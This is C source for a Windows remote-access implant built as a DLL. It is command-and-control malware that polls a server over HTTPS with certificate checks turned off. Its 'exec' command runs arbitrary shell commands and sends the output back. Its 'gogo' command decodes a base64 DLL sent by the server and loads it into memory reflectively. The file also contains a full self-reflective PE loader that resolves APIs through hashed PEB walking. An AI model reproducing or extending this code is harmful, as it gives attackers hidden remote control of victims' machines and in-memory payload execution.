// cl.exe /LD /MD main.c gadget_loader.c /Fo.\obj\ /O2 /Ot /GL

#include "main.h"

CommandStruct clientinfo;

char* HEADER_KEY_COMMAND  = "command: ";
char* HEADER_KEY_COMMANDS = "Commands: ";
char* HEADER_KEY_CLIENTID = "clientid: ";

unsigned char time_to_quit = 0;

// Built-in Commands
char* CMD_exec(char* args)
{
    char* tmp = execute_command(args);
    debugf("Command: %s\nResult: %s\n", args, tmp);
    return tmp;
}

char* CMD_shell(char* args)
{
    MessageBox(NULL, "Received shell command", "Shell Command", MB_OK);
    return NULL;
}

char* CMD_gogo(char* args)
{
    debugf("Received gogo command with arguments: %s\n", args);
    size_t gadget_len = 0;
    LPVOID lpBuffer = NULL;
    HANDLE hModule  = NULL;
    unsigned char* gadget = base64_decode(args, strlen(args), &gadget_len);

    if (gadget == NULL)
    {
        return NULL;
    }
    
    debugf("gadget: %p gadget length: %zu", gadget, gadget_len);
    CommandNodePointer func;
    hModule = (HANDLE)ReflectiveLoader(gadget, &func);
    if(!hModule)
    {
        debugf("Failed to inject the DLL");
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        return NULL;
    }
    
    CommandNode* tester = func();
    debugf("Tester: %s\n", tester->command);

    insertCommandNode(clientinfo.commandList, createCommandNode(tester->command, tester->function));
    SAFE_FREE(clientinfo.data_commands);
    clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
    update_curl_headers();

    debugf("Inserted command!\n");

    return NULL;
}

// TODO: This successfully stops the thread (if injected) or process (if running as executable)
// If injected, this does NOT free the mapped memory.
char* CMD_quit(char* args)
{
    time_to_quit = 1;
    return NULL;
}

char* CMD_install(char* args)
{
    FILE *fp = fopen("installed.txt", "w");
    if (fp != NULL)
    {
        fprintf(fp, "Installed\n");
        fclose(fp);
    }
    return NULL;
}

// Callback function to handle incoming data
void check_response(char* data)
{   
    // Find the first space character to separate command and arguments
    char *space_pos = strchr(data, ' ');

    // Replace space with null byte to separate command and arguments
    if (space_pos != NULL)
    {
        *space_pos = '\0';
    }
    // Calculate pointers for command and arguments
    char *command = data;
    char *arguments = space_pos + 1;

    CommandNode* commandnode = findCommandNode(clientinfo.commandList, command);

    if (commandnode != NULL)
    {
        // If it's an `exec` command, the arguments (ie "ls -al") are the actual command
        if (!strcmp(commandnode->command, "exec"))
        {
            clientinfo.data_command = strdup(arguments);
        }
        else
        {
            clientinfo.data_command = strdup(commandnode->command);
        }
        clientinfo.data_response = commandnode->function(arguments);
    }
}

int main(void)
{
    debugf("main.\n");
    // Initialize the CommandStruct
    clientinfo.commandList     = create_list();
    clientinfo.header_command  = HEADER_KEY_COMMAND;
    clientinfo.header_commands = HEADER_KEY_COMMANDS;
    clientinfo.header_clientid = HEADER_KEY_CLIENTID;
    clientinfo.data_command   = NULL;
    clientinfo.data_commands   = NULL;
    clientinfo.data_clientid   = "10"; // TODO: Not static
    clientinfo.data_response   = NULL;
    clientinfo.client_headers  = NULL;

    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Initialize built-in commands
    insertCommandNode(clientinfo.commandList, createCommandNode("exec", CMD_exec));
    insertCommandNode(clientinfo.commandList, createCommandNode("shell", CMD_shell));
    insertCommandNode(clientinfo.commandList, createCommandNode("gogo", CMD_gogo));
    insertCommandNode(clientinfo.commandList, createCommandNode("quit", CMD_quit));
    insertCommandNode(clientinfo.commandList, createCommandNode("install", CMD_install));

    // Initialize available commands that the server returns; updated in `gogo` command
    debugf("Getting commands\n");
    clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
    update_curl_headers();

    // Start C2
    debugf("Starting C2\n");

    jitter_connect();

    // End
    curl_global_cleanup();
}

void jitter_connect()
{
    // TODO: Make this jitter instead of a constant time.
    // Seperate initial connect from interactive connection?
    // Initial connect will probably be handled by a wrapper program, in case of crashes in this one
    while (!time_to_quit)
    {
        command_loop();
        Sleep(5 * 1000);  
    }
}

// Callback function to write received data to a dynamically growing buffer
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
    
    // Reallocate memory to fit the new data
    char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr_realloc == NULL)
    {
        debugf("Memory allocation failed\n");
        return 0;
    }
    
    mem->memory = ptr_realloc;
    memcpy(&(mem->memory[mem->size]), ptr, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = '\0';
    
    return realsize;
}

void update_curl_headers(void)
{
    // Dump exising headers
    if (clientinfo.client_headers)
    {
        curl_slist_free_all(clientinfo.client_headers);
    }

    // Create a new header list
    char* clientid = make_header(clientinfo.header_clientid, clientinfo.data_clientid);
    char* commands = make_header(clientinfo.header_commands, clientinfo.data_commands);
    debugf("commands: %s\n", commands);
    clientinfo.client_headers = curl_slist_append(NULL, clientid);
    curl_slist_append(clientinfo.client_headers, commands);

    debugf("Added first two headers.\n");
    // curl append `strdup`s the data, so free our buffers
    SAFE_FREE(clientid);
    SAFE_FREE(commands);

    // Add command header (executed command)
    if (clientinfo.data_command)
    {
        char* command = make_header(clientinfo.header_command, clientinfo.data_command);
        curl_slist_append(clientinfo.client_headers, command);
        SAFE_FREE(command);
    }
    debugf("End of update headers.\n");
}

char* make_header(const char* header, const char* data)
{
    size_t buffer_len = strlen(header) + strlen(data) + 2;
    char* buffer = calloc(buffer_len, sizeof(char));
    if (!buffer)
    {
        return NULL;
    }
    if (snprintf(buffer, buffer_len, "%s%s", header, data) < 0)
    {
        return NULL;
    }
    debugf("Make header, buffer: %s\n", buffer);
    return buffer;
}

void command_loop(void)
{
    struct MemoryStruct chunk;

    // Stuff that will need to be free'd
    CURL *curl = NULL;
    chunk.memory = calloc(1,1);

    // Initialize the "chunk" used to receive data
    if (chunk.memory == NULL)
    {
        debugf("Memory allocation failed\n");
        return;
    }
    chunk.size = 0;  // No data yet
    
    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");      // TODO: Round-robin servers

        // For errors
        char errbuf[CURL_ERROR_SIZE];
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
        errbuf[0] = 0;

        // If clientinfo.data_response is not NULL, we have data to send to the server
        if (clientinfo.data_response != NULL)
        {
            debugf("sending response: %s\n", clientinfo.data_response);
            // Does not create a copy of data, so mark that it needs to be free'd
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, clientinfo.data_response);
            // Update headers with current command
            update_curl_headers();
        }
        else
        {
            // No data to send to server, so perform a GET request
            // curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
        }

        // Set headers
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, clientinfo.client_headers);

        // Disable SSL certificate verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        // Specify the callback function to handle the response data
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        // If sent a response, free the response and remove the command header
        // This happens here before we check the `current` response from server
        if (clientinfo.data_response)
        {
            SAFE_FREE(clientinfo.data_response);
            SAFE_FREE(clientinfo.data_command);
            update_curl_headers();
        }

        if (res != CURLE_OK)
        {
            size_t len = strlen(errbuf);
            debugf("\nlibcurl: (%d) ", res);
            if(len)
            {
                debugf("IF:%s\n", errbuf);
            }
            else
            {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                debugf("ELSE:%s\n", curl_easy_strerror(res));
                debugf("Response code: %ld\n", response_code);
            }
        }
        else
        {
            // Don't assume empty memory was assigned to chunk.memory, so check chunk.size
            if (chunk.size)
            {
                check_response(chunk.memory);
            }
        }

        // Cleanup
        debugf("performing curl cleanup.\n");
        curl_easy_cleanup(curl);
    }
    debugf("Freeing stuff.\n");
    SAFE_FREE(chunk.memory);
    debugf("Done with loop\n");
}

// Execute a command and capture its output. Cross-compilable for both Unix and Windows
char *execute_command(const char *cmd)
{
    #ifdef _WIN32
    #define popen _popen
    #define pclose _pclose
    #endif
    FILE *fp;
    char *result = NULL;
    char *tmp = NULL;
    char line[1024];
    size_t len = 0;
    size_t total_size = 0;

    // Open the command for reading
    fp = popen(cmd, "r");
    if (fp == NULL)
    {
        debugf("Failed to run command\n");
        return NULL;
    }

    // Read output line by line and dynamically allocate memory
    while (fgets(line, sizeof(line), fp) != NULL)
    {
        size_t line_length = strlen(line);
        tmp = realloc(result, total_size + line_length + 1);
        if (tmp == NULL)
        {
            debugf("Memory allocation failed\n");
            pclose(fp);
            return result;
        }
        result = tmp;
        strcpy(result + total_size, line);
        total_size += line_length;
    }

    // Clean up
    pclose(fp);
    return result;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    // MessageBox(NULL, "DLL Loaded! DLL Main Called", "DLL Loaded!", MB_ICONINFORMATION);
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            main();
            // DLL is being loaded
            if( lpReserved != NULL )
            {
                //MessageBox(NULL, "Setting lpReserved!", "d", MB_ICONINFORMATION);
            }
            break;
        case DLL_PROCESS_DETACH:
            // DLL is being unloaded
            break;
        case DLL_THREAD_ATTACH:
            // A new thread is being created in the process
            break;
        case DLL_THREAD_DETACH:
            // A thread is exiting cleanly
            break;
    }
    return TRUE; // Successful DLL_PROCESS_ATTACH.
}

#include "main_reflective.h"

__declspec(dllexport) ULONG_PTR SelfReflectiveLoader( LPVOID lpAddr) {
    // the functions we need
    LOADLIBRARYA pLoadLibraryA     = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    VIRTUALALLOC pVirtualAlloc     = NULL;
    VIRTUALPROTECT pVirtualProtect = NULL;
    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    USHORT usCounter;

    // the initial location of this image in memory
    ULONG_PTR uiLibraryAddress;
    // the kernels base address and later this images newly loaded base address
    ULONG_PTR uiBaseAddress;

    // variables for processing the kernels export table
    ULONG_PTR uiAddressArray;
    ULONG_PTR uiNameArray;
    ULONG_PTR uiExportDir;
    ULONG_PTR uiNameOrdinals;
    DWORD dwHashValue;

    // variables for loading this image
    ULONG_PTR uiHeaderValue;
    ULONG_PTR uiValueA;
    ULONG_PTR uiValueB;
    ULONG_PTR uiValueC;
    ULONG_PTR uiValueD;
    ULONG_PTR uiValueE;
    DWORD TEMP;

    // STEP 0: calculate our images current base address
    uiLibraryAddress = (ULONG_PTR)lpAddr;

    // loop through memory backwards searching for our images base address
    // we dont need SEH style search as we shouldnt generate any access violations with this
    while( TRUE )
    {
        if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
        {
            uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
            // some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
            // we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
            if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
            {
                uiHeaderValue += uiLibraryAddress;
                // break if we have found a valid MZ/PE header
                if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
                    break;
            }
        }
        uiLibraryAddress--;
    }

    // STEP 1: process the kernels exports for the functions our loader needs...
    
    // get the Process Enviroment Block
    #if defined(WIN_X64)
        uiBaseAddress = __readgsqword( 0x60 );
    #elif defined(WIN_X86)
        uiBaseAddress = __readfsdword( 0x30 );
    #endif
    // get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
    uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;
    // get the first entry of the InMemoryOrder module list
    uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
    while( uiValueA )
    {
        // get pointer to current modules name (unicode string)
        uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
        // set bCounter to the length for the loop
        usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
        // clear uiValueC which will store the hash of the module name
        uiValueC = 0;

        // compute the hash of the module name...
        do
        {
            uiValueC = ror( (DWORD)uiValueC );
            // normalize to uppercase if the madule name is in lowercase
            if( *((BYTE *)uiValueB) >= 'a' )
                uiValueC += *((BYTE *)uiValueB) - 0x20;
            else
                uiValueC += *((BYTE *)uiValueB);
            uiValueB++;
        } while( --usCounter );

        // compare the hash with that of kernel32.dll
        if( (DWORD)uiValueC == KERNEL32DLL_HASH )
        {
            // get this modules base address
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
            // get the VA of the modules NT Header
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
            // uiNameArray = the address of the modules export directory entry
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
            // get the VA of the export directory
            uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
            // get the VA for the array of name pointers
            uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
            // get the VA for the array of name ordinals
            uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );
            usCounter = 4;

            // loop while we still have imports to find
            while( usCounter > 0 )
            {
                // compute the hash values for this function name
                dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
                // if we have found a function we want we get its virtual address
                if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH || dwHashValue == VIRTUALPROTECT_HASH )
                {
                    // get the VA for the array of addresses
                    uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );
                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
                    // store this functions VA
                    if( dwHashValue == LOADLIBRARYA_HASH )
                        pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
                    else if( dwHashValue == GETPROCADDRESS_HASH )
                        pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
                    else if( dwHashValue == VIRTUALALLOC_HASH )
                        pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );
                    else if( dwHashValue == VIRTUALPROTECT_HASH)
                        pVirtualProtect = (VIRTUALPROTECT) (uiBaseAddress + DEREF_32( uiAddressArray ) );
                    usCounter--;
                }

                // get the next exported function name
                uiNameArray += sizeof(DWORD);
                // get the next exported function name ordinal
                uiNameOrdinals += sizeof(WORD);
            }
        }
        else if( (DWORD)uiValueC == NTDLLDLL_HASH )
        {
            // get this modules base address
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            // get the VA of the modules NT Header
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

            // uiNameArray = the address of the modules export directory entry
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

            // get the VA of the export directory
            uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

            // get the VA for the array of name pointers
            uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
            
            // get the VA for the array of name ordinals
            uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

            usCounter = 1;

            // loop while we still have imports to find
            while( usCounter > 0 )
            {
                // compute the hash values for this function name
                dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
                
                // if we have found a function we want we get its virtual address
                if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
                {
                    // get the VA for the array of addresses
                    uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

                    // store this functions VA
                    if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
                        pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );

                    // decrement our counter
                    usCounter--;
                }

                // get the next exported function name
                uiNameArray += sizeof(DWORD);

                // get the next exported function name ordinal
                uiNameOrdinals += sizeof(WORD);
            }
        }

        // we stop searching when we have found everything we need.
        if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache )
            break;

        // get the next entry
        uiValueA = DEREF( uiValueA );
    }

    // STEP 2: load our image into a new permanent location in memory...

    // get the VA of the NT Header for the PE to be loaded
    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

    // allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
    // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
    uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

    // we must now copy over the headers
    uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
    uiValueB = uiLibraryAddress;
    uiValueC = uiBaseAddress;

    while( uiValueA-- )
        *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

    // STEP 3: load in all of our sections...

    // uiValueA = the VA of the first section
    uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
    
    // itterate through all sections, loading them into memory.
    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
    while( uiValueE-- )
    {
        // uiValueB is the VA for this section
        uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

        // uiValueC is the VA for this sections data
        uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

        // copy the section over
        uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

        while( uiValueD-- )
            *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

        // Mark RX if its an executable section
        if ( (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & 0x20) || (((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics & 0x20000000) )
        {
            // We can overwrite uiValueB at this point.
            if (!pVirtualProtect( (LPVOID)(uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress), ((PIMAGE_SECTION_HEADER)uiValueA)->Misc.VirtualSize, PAGE_EXECUTE_READ, (DWORD*)&uiValueB ))
                return (ULONG_PTR)NULL;
        }

        // get the VA of the next section
        uiValueA += sizeof( IMAGE_SECTION_HEADER );
    }

    // STEP 4: process our images import table...

    // uiValueB = the address of the import directory
    uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
    
    // we assume their is an import table to process
    // uiValueC is the first entry in the import table
    uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
    
    // iterate through all imports
    while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
    {
        // use LoadLibraryA to load the imported module into memory
        uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

        // uiValueD = VA of the OriginalFirstThunk
        uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
    
        // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
        uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

        // itterate through all imported functions, importing by ordinal if no name present
        while( DEREF(uiValueA) )
        {
            // sanity check uiValueD as some compilers only import by FirstThunk
            if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                // get the VA of the modules NT Header
                uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

                // uiNameArray = the address of the modules export directory entry
                uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

                // get the VA of the export directory
                uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

                // get the VA for the array of addresses
                uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

                // use the import ordinal (- export ordinal base) as an index into the array of addresses
                uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

                // patch in the address for this imported function
                DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
            }
            else
            {
                // get the VA of this functions import by name struct
                uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

                // use GetProcAddress and patch in the address for this imported function
                DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
            }
            // get the next imported function
            uiValueA += sizeof( ULONG_PTR );
            if( uiValueD )
                uiValueD += sizeof( ULONG_PTR );
        }

        // get the next import
        uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
    }

    // STEP 5: process all of our images relocations...

    // calculate the base address delta and perform relocations (even if we load at desired image base)
    uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

    // uiValueB = the address of the relocation directory
    uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

    // check if their are any relocations present
    if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
    {
        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
        uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

        // and we itterate through all entries...
        while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
        {
            // uiValueA = the VA for this relocation block
            uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

            // uiValueB = number of entries in this relocation block
            uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

            // uiValueD is now the first entry in the current relocation block
            uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

            // we itterate through all the entries in the current block...
            while( uiValueB-- )
            {
                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                // we dont use a switch statement to avoid the compiler building a jump table
                // which would not be very position independent!
                if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
                    *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
                    *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

                // get the next entry in the current relocation block
                uiValueD += sizeof( IMAGE_RELOC );
            }

            // get the next entry in the relocation directory
            uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
        }
    }

    // STEP 6: call our images entry point
  
    // uiValueA = the VA of our newly loaded DLL/EXE's entry point
    uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );

    // call our respective entry point, fudging our hInstance value
    ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpAddr );

    // STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
    return uiValueA;
}